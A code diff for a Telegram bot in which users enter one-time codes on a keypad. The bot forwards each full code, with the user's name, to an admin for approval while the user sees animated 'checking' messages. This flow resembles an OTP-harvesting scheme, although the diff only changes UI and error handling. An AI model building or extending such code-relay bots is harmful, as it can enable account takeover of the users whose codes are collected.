@@ -142,11 +142,13 @@ async def otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     f"📩 *OTP Submitted*\nUser: {update.effective_user.full_name}\nCode: `{current_otp}`",
                     reply_markup=get_admin_approval_keyboard(update.effective_user.id)
                 )
-                await animate_message(update, context, CHECKING_CODE_MSGS)
-                await animate_message(update, context, CONFIRMING_MSGS)
+                # Send a confirmation to the user
+                await query.message.edit_text("Code submitted! Waiting for admin approval... ⏳")
+                await animate_message(update, context, CHECKING_CODE_MSGS, target_message=query.message)
+                await animate_message(update, context, CONFIRMING_MSGS, target_message=query.message)
                 return ADMIN_CONFIRMATION
             else:
-                await query.answer("Please enter the code first! ⚠️")
+                await query.answer("Please enter the code first! ⚠️", show_alert=True)
                 return AWAITING_CODE
         else:
             if len(current_otp) < 5:
@@ -155,11 +157,15 @@ async def otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['otp_input'] = current_otp
         # Show masked dots for digits not yet entered
         display_otp = current_otp + ("_" * (5 - len(current_otp)))
-        await query.message.edit_text(
-            f"{ENTER_CODE_MSG}\n\nCurrent: `{display_otp}`",
-            reply_markup=get_otp_keyboard(),
-            parse_mode='Markdown'
-        )
+        try:
+            await query.message.edit_text(
+                f"{ENTER_CODE_MSG}\n\nCurrent: `{display_otp}`",
+                reply_markup=get_otp_keyboard(),
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            logging.error(f"Error editing OTP message: {e}")
+            
     return AWAITING_CODE
 
 async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -169,7 +175,8 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if data == "admin_panel":
         if context.user_data.get('is_admin_auth'):
-            return await admin_menu_callback(update, context)
+            await admin_menu_callback(update, context)
+            return ADMIN_PANEL
         await query.message.reply_text("🔑 Please enter the Admin Secret Key:")
         return ADMIN_AUTH
     
